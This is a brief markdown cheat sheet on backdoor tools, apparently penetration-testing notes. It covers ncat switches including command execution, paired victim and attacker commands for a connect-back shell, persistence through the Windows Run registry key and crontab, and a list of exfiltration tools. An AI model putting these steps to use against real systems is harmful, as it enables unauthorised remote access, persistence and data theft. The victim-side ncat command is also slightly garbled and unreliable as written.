# Backdoor tools

## Netcat, ncat, nc

* Ncat
    Switches

    * -l Listening
    * -e, --exec Execute command (E.g, /bin/bash, cmd.exe)
    * -p Port
    * -v Verbose
    * -n Do not resolve hostname via DNS (Numbers only)

Victim Computer
```
$ncat -nv HOST -p 1234
```

Attacker Computer
```
$ncat -lnvp 1234
```


## Install Persistant Backdoor

Windows Registery

```
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Add string Values
```

Linux Cron

```
Add the command in Crontab
```

--------------------------------------------

## Exfiltration Tecnhiques and Tools

* PacketWhisper.py
* Netcat file redirection
* Scp (Secure copy)
* Simple_http_server.py (Python module)

